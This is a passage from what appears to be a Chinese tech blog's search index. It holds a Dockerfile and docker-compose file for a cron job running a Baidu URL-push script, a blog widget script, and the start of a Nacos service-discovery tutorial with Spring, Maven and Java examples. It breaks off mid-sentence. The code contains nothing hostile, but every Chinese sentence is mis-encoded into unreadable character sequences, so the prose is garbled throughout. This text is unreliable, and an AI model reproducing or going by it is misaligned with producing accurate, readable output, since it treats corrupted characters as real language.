çš„å†…å®¹å¦‚ä¸‹ï¼Œæ„å»ºç”Ÿæˆ Docker é•œåƒåï¼Œä½¿ç”¨å‘½ä»¤ç›´æ¥å¯åŠ¨ Docker é•œåƒå³å¯ã€‚ ä½¿ç”¨å‘½ä»¤ç›´æ¥å¯åŠ¨ Docker é•œåƒæ—¶ï¼Œéœ€è¦é€šè¿‡ -v å‚æ•°å°†å®¿ä¸»æœºçš„ Python è„šæœ¬æ–‡ä»¶æŒ‚è½½åˆ° Docker å®¹å™¨å†…çš„ /usr/local/python_scripts/baidu_xiongzhang_day.py ä½ç½®ã€‚ 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i "s/#cron./cron./g" /etc/rsyslog.confRUN echo "0 3 * * * root /usr/bin/python3 /usr/local/python_scripts/baidu_xiongzhang_day.py" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log è‹¥é€šè¿‡ Docker-Compose æ¥ç®¡ç† Docker é•œåƒï¼Œé‚£ä¹ˆ YML é…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 123456789101112version: \'3.5\'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: \'Asia/Shanghai\' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/baidu_xiongzhang_day.py:/usr/local/python_scripts/baidu_xiongzhang_day.py æ•°æ®å·æŒ‚è½½ï¼š /usr/local/baidu-push/logsï¼šå®¿ä¸»æœºé‡Œçš„æ—¥å¿—ç›®å½• /usr/local/baidu-push/baidu_xiongzhang_day.pyï¼šå®¿ä¸»æœºé‡Œ Python è„šæœ¬æ–‡ä»¶çš„è·¯å¾„ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"python"},{title:"Nacos å…¥é—¨æ•™ç¨‹ - æœåŠ¡å‘ç°åŸºç¡€ç¯‡",url:"/posts/f9da4c12.html",text:'æœåŠ¡å‘ç°ä»‹ç»å¾®æœåŠ¡æ¶æ„æ¦‚è¿°ä¸ºé€‚åº”ä¼ä¸šçš„ä¸šåŠ¡å‘å±•ï¼Œæé«˜è½¯ä»¶ç ”å‘çš„ç”Ÿäº§åŠ›ï¼Œé™ä½è½¯ä»¶ç ”å‘çš„æˆæœ¬ï¼Œè½¯ä»¶æ¶æ„ä¹Ÿä½œäº†å‡çº§å’Œä¼˜åŒ–ï¼Œå°†ä¸€ä¸ªç‹¬ç«‹çš„ç³»ç»Ÿæ‹†åˆ†æˆè‹¥å¹²å°çš„æœåŠ¡ï¼Œæ¯ä¸ªå°æœåŠ¡è¿è¡Œåœ¨ä¸åŒçš„è¿›ç¨‹ä¸­ï¼ŒæœåŠ¡ä¸æœåŠ¡ä¹‹é—´é‡‡ç”¨ RESTfulã€RPC ç­‰åè®®ä¼ è¾“æ•°æ®ï¼Œæ¯ä¸ªæœåŠ¡æ‰€æ‹¥æœ‰çš„åŠŸèƒ½å…·æœ‰ç‹¬ç«‹æ€§å¼ºçš„ç‰¹ç‚¹ï¼Œè¿™æ ·çš„è®¾è®¡å°±å®ç°äº†å•ä¸ªæœåŠ¡çš„é«˜å†…èšï¼ŒæœåŠ¡ä¸æœåŠ¡ä¹‹é—´çš„ä½è€¦åˆæ•ˆæœï¼Œè¿™äº›å°æœåŠ¡å°±æ˜¯å¾®æœåŠ¡ï¼ŒåŸºäºè¿™ç§æ–¹æ³•è®¾è®¡çš„ç³»ç»Ÿæ¶æ„å³å¾®æœåŠ¡æ¶æ„ã€‚å¾®æœåŠ¡æ¶æ„çš„ä¼˜ç‚¹å¦‚ä¸‹ï¼š æ˜“äºå¼€å‘å’Œç»´æŠ¤ï¼šä¸€ä¸ªå¾®æœåŠ¡åªä¼šå…³æ³¨ä¸€ä¸ªç‰¹å®šçš„ä¸šåŠ¡åŠŸèƒ½ï¼Œæ‰€ä»¥å®ƒä¸šåŠ¡æ¸…æ™°ï¼Œä»£ç é‡è¾ƒå°‘ å•ä¸ªå¾®æœåŠ¡å¯åŠ¨è¾ƒå¿«ï¼šå•ä¸ªå¾®æœåŠ¡ä»£ç é‡è¾ƒå°‘ï¼Œæ‰€ä»¥å¯åŠ¨ä¼šæ¯”è¾ƒå¿« ä¸šåŠ¡ä¹‹é—´æ¾è€¦åˆï¼Œæ— è®ºæ˜¯åœ¨å¼€å‘é˜¶æ®µæˆ–è€…éƒ¨ç½²é˜¶æ®µï¼Œä¸åŒçš„æœåŠ¡éƒ½æ˜¯äº’ç›¸ç‹¬ç«‹çš„ å±€éƒ¨ä¿®æ”¹å®¹æ˜“éƒ¨ç½²ï¼šå•ä½“åº”ç”¨åªè¦æœ‰ä¿®æ”¹ï¼Œå°±å¾—é‡æ–°éƒ¨ç½²æ•´ä¸ªåº”ç”¨ï¼Œå¾®æœåŠ¡è§£å†³äº†è¿™æ ·çš„é—®é¢˜ æŠ€æœ¯æ ˆä¸å—é™ï¼šåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œå¯ä»¥ç»“åˆé¡¹ç›®ä¸šåŠ¡åŠå›¢é˜Ÿçš„ç‰¹ç‚¹ï¼Œåˆç†åœ°é€‰æ‹©æŠ€æœ¯æ ˆ æŒ‰éœ€ä¼¸ç¼©ï¼šå¯æ ¹æ®éœ€æ±‚ï¼Œå®ç°ç»†ç²’åº¦çš„æ‰©å±• åªæœ‰ä¸šåŠ¡é€»è¾‘çš„ä»£ç ï¼Œä¸ä¼šå’Œ HTMLã€CSS æˆ–è€…å…¶ä»–å‰ç«¯é¡µé¢è€¦åˆï¼Œç›®å‰æœ‰ä¸¤ç§å¼€å‘æ¨¡å¼ï¼šå‰åç«¯åˆ†ç¦»ã€å…¨æ ˆå¼€å‘ ä»€ä¹ˆæ˜¯æœåŠ¡å‘ç°åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œæ•´ä¸ªç³»ç»Ÿä¼šæŒ‰èŒè´£èƒ½åŠ›åˆ’åˆ†ä¸ºå¤šä¸ªæœåŠ¡ï¼Œé€šè¿‡æœåŠ¡ä¹‹é—´åä½œæ¥å®ç°ä¸šåŠ¡ç›®æ ‡ã€‚è¿™æ ·åœ¨ä»£ç ä¸­å…ä¸äº†è¦è¿›è¡ŒæœåŠ¡é—´çš„è¿œç¨‹è°ƒç”¨ï¼ŒæœåŠ¡çš„æ¶ˆè´¹æ–¹è¦è°ƒç”¨æœåŠ¡çš„ç”Ÿäº§æ–¹ï¼Œä¸ºäº†å®Œæˆä¸€æ¬¡è¯·æ±‚ï¼Œæ¶ˆè´¹æ–¹éœ€è¦çŸ¥é“æœåŠ¡ç”Ÿäº§æ–¹çš„ç½‘ç»œä½ç½®ï¼ˆIP åœ°å€å’Œç«¯å£å·ï¼‰ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä»£ç å¯ä»¥é€šè¿‡è¯»å–é…ç½®æ–‡ä»¶çš„æ–¹å¼è¯»å–æœåŠ¡ç”Ÿäº§æ–¹ç½‘ç»œä½ç½®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š çœ‹ä¸Šå»å¾ˆå®Œç¾ï¼Œä½†æ˜¯ä»”ç»†è€ƒè™‘ä»¥ä¸‹ï¼Œæ­¤æ–¹æ¡ˆå¯¹äºå¾®æœåŠ¡åº”ç”¨è€Œè¨€è¡Œä¸é€šã€‚é¦–å…ˆï¼Œå¾®æœåŠ¡å¯èƒ½æ˜¯éƒ¨ç½²åœ¨äº‘ç¯å¢ƒçš„ï¼ŒæœåŠ¡å®ä¾‹çš„ç½‘ç»œä½ç½®æˆ–è®¸æ˜¯åŠ¨æ€åˆ†é…çš„ã€‚å¦å¤–ï¼Œæ¯ä¸€ä¸ªæœåŠ¡ä¸€èˆ¬ä¼šæœ‰å¤šä¸ªå®ä¾‹æ¥åšè´Ÿè½½å‡è¡¡ï¼Œç”±äºå®•æœºæˆ–å‡çº§ï¼ŒæœåŠ¡å®ä¾‹ç½‘ç»œåœ°å€ä¼šç»å¸¸åŠ¨æ€æ”¹å˜ã€‚å†è€…ï¼Œæ¯ä¸€ä¸ªæœåŠ¡ä¹Ÿå¯èƒ½åº”å¯¹ä¸´æ—¶è®¿é—®å‹åŠ›å¢åŠ æ–°çš„æœåŠ¡èŠ‚ç‚¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åŸºäºä»¥ä¸Šçš„é—®é¢˜ï¼ŒæœåŠ¡ä¹‹é—´å¦‚ä½•ç›¸äº’å‘ç°ï¼ŸæœåŠ¡å¦‚ä½•ç®¡ç†ï¼Ÿè¿™å°±æ˜¯æœåŠ¡å‘ç°çš„é—®é¢˜äº†ã€‚æœåŠ¡å‘ç°å°±æ˜¯æœåŠ¡æ¶ˆè´¹æ–¹é€šè¿‡æœåŠ¡å‘ç°ä¸­å¿ƒæ™ºèƒ½å‘ç°æœåŠ¡æä¾›æ–¹ï¼Œä»è€Œè¿›è¡Œè¿œç¨‹è°ƒç”¨çš„è¿‡ç¨‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¸Šå›¾ä¸­æœåŠ¡å®ä¾‹æœ¬èº«å¹¶ä¸è®°å½•æœåŠ¡ç”Ÿäº§æ–¹çš„ç½‘ç»œåœ°å€ï¼Œæ‰€æœ‰æœåŠ¡å®ä¾‹å†…éƒ¨éƒ½ä¼šåŒ…å«æœåŠ¡å‘ç°å®¢æˆ·ç«¯ã€‚ åœ¨æ¯ä¸ªæœåŠ¡å¯åŠ¨æ—¶ä¼šå‘æœåŠ¡å‘ç°ä¸­å¿ƒä¸ŠæŠ¥è‡ªå·±çš„ç½‘ç»œä½ç½®ï¼Œè¿™æ ·åœ¨æœåŠ¡å‘ç°ä¸­å¿ƒå†…éƒ¨ä¼šå½¢æˆä¸€ä¸ªæœåŠ¡æ³¨å†Œè¡¨ï¼ŒæœåŠ¡æ³¨å†Œè¡¨æ˜¯æœåŠ¡å‘ç°çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œæ˜¯åŒ…å«æ‰€æœ‰æœåŠ¡å®ä¾‹çš„ç½‘ç»œåœ°å€çš„æ•°æ®åº“ æœåŠ¡å‘ç°å®¢æˆ·ç«¯ä¼šå®šæœŸä»æœåŠ¡å‘ç°ä¸­å¿ƒåŒæ­¥æœåŠ¡æ³¨å†Œè¡¨ï¼Œå¹¶ç¼“å­˜åœ¨å®¢æˆ·ç«¯ å½“éœ€è¦å¯¹æŸæœåŠ¡è¿›è¡Œè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å®ä¾‹é€šè¿‡è¯¥æ³¨å†Œè¡¨ï¼Œå®šä½ç›®æ ‡æœåŠ¡ç½‘ç»œåœ°å€ã€‚è‹¥ç›®æ ‡æœåŠ¡å­˜åœ¨å¤šä¸ªç½‘ç»œåœ°å€ï¼Œåˆ™ä½¿ç”¨è´Ÿè½½å‡è¡¡ç®—æ³•ä»å¤šä¸ªæœåŠ¡å®ä¾‹ä¸­é€‰æ‹©å‡ºä¸€ä¸ªï¼Œç„¶åå‘å‡ºè¯·æ±‚ã€‚ æ€»ç»“ï¼š åœ¨å¾®æœåŠ¡ç¯å¢ƒä¸­ï¼Œç”±äºæœåŠ¡è¿è¡Œå®ä¾‹çš„ç½‘ç»œåœ°å€æ˜¯ä¸æ–­åŠ¨æ€å˜åŒ–çš„ï¼ŒæœåŠ¡å®ä¾‹æ•°é‡çš„åŠ¨æ€å˜åŒ– ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨å›ºå®šçš„é…ç½®æ–‡ä»¶æ¥è®°å½•æœåŠ¡æä¾›æ–¹çš„ç½‘ç»œåœ°å€ï¼Œå¿…é¡»ä½¿ç”¨åŠ¨æ€çš„æœåŠ¡å‘ç°æœºåˆ¶ç”¨äºå®ç°å¾®æœåŠ¡é—´çš„ç›¸äº’æ„ŸçŸ¥ã€‚å„æœåŠ¡å®ä¾‹ä¼šä¸ŠæŠ¥è‡ªå·±çš„ç½‘ç»œåœ°å€ï¼Œè¿™æ ·æœåŠ¡ä¸­å¿ƒå°±å½¢æˆäº†ä¸€ä¸ªå®Œæ•´çš„æœåŠ¡æ³¨å†Œè¡¨ï¼Œå„æœåŠ¡å®ä¾‹ä¼šé€šè¿‡æœåŠ¡å‘ç°ä¸­å¿ƒæ¥è·å–è®¿é—®ç›®æ ‡æœåŠ¡çš„ç½‘ç»œåœ°å€ï¼Œä»è€Œå®ç°æœåŠ¡å‘ç°çš„æœºåˆ¶ã€‚ æœåŠ¡å‘ç°åä½œæµç¨‹ æœåŠ¡å‘ç°äº§å“å¯¹æ¯” Nacos ä½œä¸ºæœåŠ¡å‘ç°ä¸­å¿ƒï¼Œå…·å¤‡æ›´å¤šçš„åŠŸèƒ½æ”¯æŒé¡¹ï¼Œä¸”ä»é•¿è¿œæ¥çœ‹ Nacos åœ¨ä»¥åçš„ç‰ˆæœ¬ä¼šæ”¯æŒ Spring Cloud + Kubernetes çš„ç»„åˆï¼Œå¡«è¡¥ä¸¤è€…è€…çš„é¸¿æ²Ÿï¼Œåœ¨ä¸¤å¥—ä½“ç³»ä¸‹å¯ä»¥é‡‡ç”¨åŒä¸€å¥—æœåŠ¡å‘ç°å’Œé…ç½®ç®¡ç†çš„è§£å†³æ–¹æ¡ˆï¼Œè¿™å°†å¤§å¤§çš„ç®€åŒ–ä½¿ç”¨å’Œç»´æŠ¤çš„æˆæœ¬ã€‚å¦å¤–ï¼ŒNacos è®¡åˆ’å®ç° Service Meshï¼Œä¹Ÿæ˜¯æœªæ¥å¾®æœåŠ¡å‘å±•çš„è¶‹åŠ¿ï¼Œæ›´å¤šå…³äº Nacos çš„ä»‹ç»å¯ä»¥çœ‹è¿™é‡Œã€‚ Nacos æœåŠ¡å‘ç°ç®¡ç†æœåŠ¡å‘ç°æ•°æ®æ¨¡å‹Nacos åœ¨ç»è¿‡é˜¿é‡Œå†…éƒ¨å¤šå¹´ç”Ÿäº§ç»éªŒåæç‚¼å‡ºçš„æ•°æ®æ¨¡å‹ï¼Œæ˜¯ä¸€ç§æœåŠ¡ - é›†ç¾¤ - å®ä¾‹çš„ä¸‰å±‚æ¨¡å‹ï¼Œè¿™æ ·åŸºæœ¬å¯ä»¥æ»¡è¶³æœåŠ¡åœ¨æ‰€æœ‰åœºæ™¯ä¸‹çš„æ•°æ®å­˜å‚¨å’Œç®¡ç†ã€‚ å‘½åç©ºé—´ï¼ˆNamespaceï¼‰ ç”¨äºè¿›è¡Œç§Ÿæˆ·ç²’åº¦çš„é…ç½®éš”ç¦»ï¼Œå‘½åç©ºé—´ä¸ä»…é€‚ç”¨äº Nacos çš„é…ç½®ç®¡ç†ï¼ŒåŒæ ·é€‚ç”¨äºæœåŠ¡å‘ç°ã€‚Namespace çš„å¸¸ç”¨åœºæ™¯ä¹‹ä¸€æ˜¯ä¸åŒç¯å¢ƒçš„é…ç½®çš„åŒºåˆ†éš”ç¦»ï¼Œä¾‹å¦‚å¼€å‘æµ‹è¯•ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒçš„èµ„æºï¼ˆå¦‚é…ç½®ã€æœåŠ¡ï¼‰éš”ç¦»ç­‰ã€‚ æœåŠ¡ æä¾›ç»™å®¢æˆ·ç«¯çš„è½¯ä»¶åŠŸèƒ½ï¼Œé€šè¿‡é¢„å®šä¹‰æ¥å£è¿›è¡Œç½‘ç»œè®¿é—®ã€‚ æœåŠ¡å æœåŠ¡æä¾›æ–¹çš„æ ‡è¯†ï¼Œé€šè¿‡è¯¥æ ‡è¯†å¯ä»¥å”¯ä¸€ç¡®å®šå…¶æŒ‡ä»£çš„æœåŠ¡ã€‚ å®ä¾‹ æä¾›ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡çš„å…·æœ‰å¯è®¿é—®ç½‘ç»œåœ°å€ï¼ˆIP:Portï¼‰çš„è¿›ç¨‹ï¼Œå¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼Œå°±äº§ç”Ÿäº†ä¸€ä¸ªæœåŠ¡å®ä¾‹ã€‚ å…ƒä¿¡æ¯ Nacos æ•°æ®ï¼ˆå¦‚é…ç½®å’ŒæœåŠ¡ï¼‰æè¿°ä¿¡æ¯ï¼Œå¦‚æœåŠ¡ç‰ˆæœ¬ã€æƒé‡ã€å®¹ç¾ç­–ç•¥ã€è´Ÿè½½å‡è¡¡ç­–ç•¥ã€é‰´æƒé…ç½®ã€å„ç§è‡ªå®šä¹‰æ ‡ç­¾ (labelï¼‰ï¼Œä»ä½œç”¨èŒƒå›´æ¥çœ‹ï¼Œåˆ†ä¸ºæœåŠ¡çº§åˆ«çš„å…ƒä¿¡æ¯ã€é›†ç¾¤çš„å…ƒä¿¡æ¯åŠå®ä¾‹çš„å…ƒä¿¡æ¯ é›†ç¾¤ æœåŠ¡å®ä¾‹çš„é›†åˆï¼ŒæœåŠ¡å®ä¾‹ç»„æˆä¸€ä¸ªé»˜è®¤é›†ç¾¤ï¼Œé›†ç¾¤å¯ä»¥è¢«è¿›ä¸€æ­¥æŒ‰éœ€æ±‚åˆ’åˆ†ï¼Œåˆ’åˆ†çš„å•ä½å¯ä»¥æ˜¯è™šæ‹Ÿé›†ç¾¤ï¼Œç›¸åŒé›†ç¾¤ä¸‹çš„å®ä¾‹æ‰èƒ½ç›¸äº’æ„ŸçŸ¥ã€‚ æœåŠ¡å‘ç°é…ç½®ç¤ºä¾‹åº”ç”¨é€šè¿‡ Namespaceã€Clusterã€Service çš„é…ç½®ï¼Œæè¿°äº†è¯¥æœåŠ¡å‘å“ªä¸ªç¯å¢ƒï¼ˆå¦‚å¼€å‘ç¯å¢ƒï¼‰çš„å“ªä¸ªé›†ç¾¤æ³¨å†Œå®ä¾‹ 123456789spring: application: name: transactionâ€service cloud: nacos: discovery: serverâ€addr: 127.0.0.1:8848 namespace: a1f8e863â€3117â€48c4â€9dd3â€e9ddc2af90a8 cluster-name: DEFAULT é›†ç¾¤ä½œä¸ºå®ä¾‹çš„éš”ç¦»ï¼Œç›¸åŒé›†ç¾¤çš„å®ä¾‹æ‰èƒ½ç›¸äº’æ„ŸçŸ¥ namespaceã€cluster-name è‹¥ä¸å¡«å†™éƒ½å°†é‡‡ç”¨é»˜è®¤å€¼ï¼Œnamespace çš„é»˜è®¤æ˜¯ public å‘½åç©ºé—´ï¼Œcluster-name çš„é»˜è®¤å€¼ä¸º DEFAULT é›†ç¾¤ æœåŠ¡å‘ç°ç®¡ç†åŠŸèƒ½æœåŠ¡ç®¡ç† å¼€å‘è€…æˆ–è€…è¿ç»´äººå‘˜å¾€å¾€éœ€è¦åœ¨æœåŠ¡æ³¨å†Œåï¼Œé€šè¿‡å‹å¥½çš„ç•Œé¢æ¥æŸ¥çœ‹æœåŠ¡çš„æ³¨å†Œæƒ…å†µï¼ŒåŒ…æ‹¬å½“å‰ç³»ç»Ÿæ³¨å†Œçš„æ‰€æœ‰æœåŠ¡å’Œæ¯ä¸ªæœåŠ¡çš„è¯¦æƒ…ã€‚å¹¶åœ¨æœ‰æƒé™æ§åˆ¶çš„æƒ…å†µä¸‹ï¼Œè¿›è¡ŒæœåŠ¡çš„ä¸€äº›é…ç½®çš„ç¼–è¾‘æ“ä½œã€‚Nacos åœ¨ç›®å‰æœ€æ–°ç‰ˆæœ¬å¼€æ”¾çš„æ§åˆ¶å°çš„æœåŠ¡å‘ç°éƒ¨åˆ†ï¼Œä¸»è¦å°±æ˜¯æä¾›ç”¨æˆ·ä¸€ä¸ªåŸºæœ¬çš„è¿ç»´é¡µé¢ï¼Œèƒ½å¤ŸæŸ¥çœ‹ã€ç¼–è¾‘å½“å‰æ³¨å†Œçš„æœåŠ¡ï¼Œè¿™äº›åŠŸèƒ½é›†ä¸­åœ¨ Nacos æ§åˆ¶å°çš„æœåŠ¡ç®¡ç†ä¸€çº§èœå•å†…ã€‚ æœåŠ¡åˆ—è¡¨ç®¡ç† æœåŠ¡åˆ—è¡¨å¸®åŠ©ç”¨æˆ·ä»¥ç»Ÿä¸€çš„è§†å›¾ç®¡ç†å…¶æ‰€æœ‰çš„å¾®æœåŠ¡ä»¥åŠæœåŠ¡å¥åº·çŠ¶æ€ã€‚æ•´ä½“ç•Œé¢å¸ƒå±€æ˜¯å·¦ä¸Šè§’æœ‰æœåŠ¡çš„æœç´¢æ¡†å’Œæœç´¢æŒ‰é’®ï¼Œé¡µé¢ä¸­å¤®æ˜¯æœåŠ¡åˆ—è¡¨çš„å±•ç¤ºã€‚æœåŠ¡åˆ—è¡¨ä¸»è¦å±•ç¤ºæœåŠ¡åã€é›†ç¾¤æ•°ç›®ã€å®ä¾‹æ•°ç›®ã€å¥åº·å®ä¾‹æ•°ç›®å’Œè¯¦æƒ…æŒ‰é’®äº”ä¸ªæ ç›®ã€‚ æœåŠ¡æµé‡æƒé‡æ”¯æŒåŠæµé‡ä¿æŠ¤ Nacos ä¸ºç”¨æˆ·æä¾›äº†æµé‡æƒé‡æ§åˆ¶çš„èƒ½åŠ›ï¼ŒåŒæ—¶å¼€æ”¾äº†æœåŠ¡æµé‡çš„é˜ˆå€¼ä¿æŠ¤ï¼Œä»¥å¸®åŠ©ç”¨æˆ·æ›´å¥½çš„ä¿æŠ¤æœåŠ¡æœåŠ¡æä¾›è€…é›†ç¾¤ä¸è¢«æ„å¤–æ‰“å®ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯ä»¥ç‚¹å‡»å®ä¾‹çš„ ç¼–è¾‘ æŒ‰é’®ï¼Œä¿®æ”¹å®ä¾‹çš„æƒé‡ã€‚å¦‚æœæƒ³å¢åŠ å®ä¾‹çš„æµé‡ï¼Œå¯ä»¥å°†æƒé‡è°ƒå¤§ï¼›å¦‚æœä¸æƒ³å®ä¾‹æ¥æ”¶æµé‡ï¼Œåˆ™å¯ä»¥å°†æƒé‡è®¾ä¸º 0ã€‚ æœåŠ¡å…ƒæ•°æ®ç®¡ç† Nacos æä¾›å¤šä¸ªç»´åº¦çš„æœåŠ¡å…ƒæ•°æ®çš„æš´éœ²ï¼Œå¸®åŠ©ç”¨æˆ·å­˜å‚¨è‡ªå®šä¹‰çš„ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯éƒ½æ˜¯ä»¥ K-V çš„æ•°æ®ç»“æ„å­˜å‚¨ï¼Œåœ¨æ§åˆ¶å°ä¸Šï¼Œä¼šä»¥ JSON æ•°æ®æ ¼å¼æ¥å±•ç¤ºã€‚ç±»ä¼¼çš„ï¼Œç¼–è¾‘å…ƒæ•°æ®å¯ä»¥é€šè¿‡ç›¸åŒçš„æ ¼å¼è¿›è¡Œã€‚ä¾‹å¦‚æœåŠ¡çš„å…ƒæ•°æ®ç¼–è¾‘ï¼Œé¦–å…ˆç‚¹å‡»æœåŠ¡è¯¦æƒ…é¡µé‡Œçš„ ç¼–è¾‘ æŒ‰é’®ï¼Œç„¶ååœ¨å…ƒæ•°æ®è¾“å…¥æ¡†è¾“å…¥ï¼š{"version": 1.0}ã€‚ æœåŠ¡ä¼˜é›…ä¸Šä¸‹çº¿ Nacos è¿˜æä¾›æœåŠ¡å®ä¾‹çš„ä¸Šä¸‹çº¿æ“ä½œï¼Œåœ¨æœåŠ¡è¯¦æƒ…é¡µé¢ï¼Œå¯ä»¥ç‚¹å‡»å®ä¾‹çš„ ä¸Šçº¿ æˆ–è€… ä¸‹çº¿ æŒ‰é’®ï¼Œè¢«ä¸‹çº¿çš„å®ä¾‹ï¼Œå°†ä¸ä¼šåŒ…å«åœ¨å¥åº·çš„å®ä¾‹åˆ—è¡¨é‡Œã€‚ Nacos Discovery Spring å…¥é—¨æ¡ˆä¾‹1.0ã€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼ŒSpring çš„ç‰ˆæœ¬ä¸º 5.2.xï¼ŒNacos Server çš„ç‰ˆæœ¬ä¸º 1.4.0ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 1.1ã€æ·»åŠ  Maven ä¾èµ–12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.2.12.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-spring-context&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt;&lt;/dependency&gt; 1.2ã€åˆ›å»º Nacos é…ç½®ç±»é€šè¿‡æ·»åŠ  @EnableNacosDiscovery æ³¨è§£å¼€å¯ Nacos Spring çš„æœåŠ¡å‘ç°åŠŸèƒ½ 1234567891011121314package com.nacos.study.configuration;import com.alibaba.nacos.api.annotation.NacosProperties;import com.alibaba.nacos.spring.context.annotation.discovery.EnableNacosDiscovery;import org.springframework.context.annotation.Configuration;/** * @author clay */@Configuration@EnableNacosDiscovery(globalProperties = @NacosProperties(serverAddr = "127.0.0.1:8848"))public class NacosConfiguration {} 1.3ã€åˆ›å»º Controller æµ‹è¯•ç±»ä½¿ç”¨ @NacosInjected æ³¨å…¥ Nacos çš„ NamingService å®ä¾‹ï¼Œé€šè¿‡è¯¥å®ä¾‹è·å– Nacos Server çš„æœåŠ¡åˆ—è¡¨ 123456789101112131415161718192021222324252627282930package com.nacos.study.controller;import com.alibaba.nacos.api.annotation.NacosInjected;import com.alibaba.nacos.api.exception.NacosException;import com.alibaba.nacos.api.naming.NamingService;import com.alibaba.nacos.api.naming.pojo.Instance;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestMethod;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody;import java.util.List;/** * @author clay */@Controller@RequestMapping("/discovery")public class DiscoveryController { @NacosInjected private NamingService namingService; @RequestMapping(value = "/get", method = RequestMethod.GET) @ResponseBody public List&lt;Instance&gt; get(@RequestParam(defaultValue = "") String serviceName) throws NacosException { return namingService.getAllInstances(serviceName); }} 1.4ã€é…ç½® web.xml12345678910&lt;servlet&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 1.5ã€é…ç½® dispatcherServlet-servlet.xml1234567&lt;!-- Spring MVC Annotation-Driven --&gt;&lt;mvc:annotation-driven/&gt;&lt;!-- Spring Context Annotation-Driven --&gt;&lt;context:annotation-config/&gt;&lt;context:component-scan base-package="com.nacos.study"/&gt; 1.6ã€è°ƒç”¨ Nacos Open API æ³¨å†ŒæœåŠ¡è°ƒç”¨ Nacos Open API æ³¨å†Œä¸€ä¸ªåç§°ä¸º example çš„æœåŠ¡ï¼Œè¿™é‡Œæ¨¡æ‹Ÿäº†æœåŠ¡ç”Ÿäº§è€…è‡ªåŠ¨æ³¨å†ŒæœåŠ¡åˆ° 